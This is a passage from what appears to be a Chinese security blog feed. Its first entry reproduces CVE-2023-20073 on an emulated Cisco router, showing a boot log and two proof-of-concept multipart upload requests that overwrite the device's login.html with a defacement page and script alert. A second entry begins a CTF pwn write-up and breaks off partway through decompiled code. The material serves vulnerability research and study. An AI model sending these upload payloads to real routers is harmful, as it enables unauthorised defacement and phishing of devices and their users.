class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /device-os-types --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /webfilter-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span>: can<span class="string">&#x27;t remove &#x27;</span>/tmp/update.sh<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Parse error (option/list command found before the first section) at line 2492, byte 1</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/etc/syslog_config_template&#x27;</span>: No such file or directory</span><br><span class="line">sed: /tmp/syslog-ng.conf: No such file or directory</span><br><span class="line">Error opening configuration file; filename=<span class="string">&#x27;/tmp/syslog-ng.conf&#x27;</span>, error=<span class="string">&#x27;Success (0)&#x27;</span></span><br><span class="line">SIOCGMIIPHY: No such device</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">0</span><br><span class="line">json_object_from_file: error reading file /tmp/webcache/dep: No such file or directory</span><br><span class="line">PnP Agent is starting!</span><br><span class="line"></span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line">/ <span class="comment"># /etc/init.d/nginx start</span></span><br><span class="line"><span class="built_in">chown</span>: /var/firmware: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/3g-4g-driver: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/in_certs: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/signature: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/language-pack: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/configuration: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /firewall-basic-settings:firewall/remote-web-management/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-restconf:ciscosb-restconf/transport/https/cert does not exist, in function do_maapi_get, line 1463</span></span><br><span class="line"><span class="string">touch: /tmp/stats/certstats.tmp: No such file or directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-netconf:ciscosb-netconf/transport/ssh/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5708)</span></span><br><span class="line"><span class="string">mapped 321280 bytes (313 KB) for 4 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: preforking ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5707)</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI path: /www/cgi-bin/upload.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5709)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5718, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5719, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 2 (pid: 5721, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5720, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 3 (pid: 5722, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 4 (pid: 5723, cores: 1)</span></span><br></pre></td></tr></table></figure><h1 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h1><h2 id="Poc1"><a href="#Poc1" class="headerlink" title="Poc1"></a>Poc1</h2><p>此时能够覆盖一个.html文件，那么html文件可以通过js来钓鱼，但是视觉效果没那么好，因此就写一个小页面吧</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331165.png" alt="image-20240811230535572"></p><p>到最后会执行<code>mv -f /tmp/upload/0000000001 /tmp/www//login.html</code>便是复现成功了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">/tmp/upload/0000000001</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Apple Style Ad<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="string">&quot;Segoe UI&quot;</span>, Roboto, <span class="string">&quot;Helvetica Neue&quot;</span>, Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f5f7</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">12px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-image</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-title</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-description</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#666</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#0071e3</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#005bb5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;your-image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Product Image&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-title&quot;</span>&gt;</span>Hacked by s1nec-1o!!!!!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-description&quot;</span>&gt;</span>welcome to iot world !!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://s1nec-1o.github.io/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-button&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331166.png" alt="image-20240811231158839"></p><h2 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h2><p>winmt师傅还有一种Poc可以更加的优雅来控制file.path，其实报文会根据配置文件来自动来添加一个 <code>xxx.path</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331167.png" alt="image-20240811232236329"></p><blockquote><ul><li>$upload_field_name  原始的文件字段</li><li>$upload_content_type 上传文件的类型</li><li>$upload_file_name 客户端上传的原始文件名称</li><li>$upload_tmp_path 上传的文件保存在服务端的位置</li></ul></blockquote><p>因此会把原始字段的名称先赋成上传文件的名称，然后上传文件的名称.path就会记录在上传的位置，即&#x2F;tmp&#x2F;upload&#x2F;0000000001，因此可以用更优雅的方式进行利用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>The website has been hacked!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;The website has been hacked&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这算是第二次复现了，第一次了了收场，还有好多东西没搞懂，这次一次性给他弄懂了，想来一步一步做下来，IoT小白(我)也是能收获满满的</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zikh26.github.io/posts/848296ab.html">ZIKH26</a></p><p><a href="https://blog.csdn.net/zzhongcy/article/details/88863037">https://blog.csdn.net/zzhongcy/article/details/88863037</a></p><p><a href="https://www.cnblogs.com/54chensongxia/p/12938929.html">https://www.cnblogs.com/54chensongxia/p/12938929.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2023-20073&quot;&gt;&lt;a href=&quot;#CVE-2023-20073&quot; class=&quot;headerlink&quot; title=&quot;CVE-2023-20073&quot;&gt;&lt;/a&gt;CVE-2023-20073&lt;/h1&gt;&lt;h1 id=&quot;提取固件&quot;&gt;&lt;a href=&quot;#提</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscn华东南pwn</title>
    <link href="http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/"/>
    <id>http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/</id>
    <published>2024-08-07T02:21:24.000Z</published>
    <updated>2024-08-07T02:44:03.927Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候全靠fix得分，也是参与上了</p><h1 id="baby-jit"><a href="#baby-jit" class="headerlink" title="baby_jit"></a>baby_jit</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;1. Add\n2. Exec\n3. Exit\n&gt;&gt; &quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;1\n&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;2\n&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exec</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是一个沙盒，然后有两个功能一个Exec和一个Add函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> 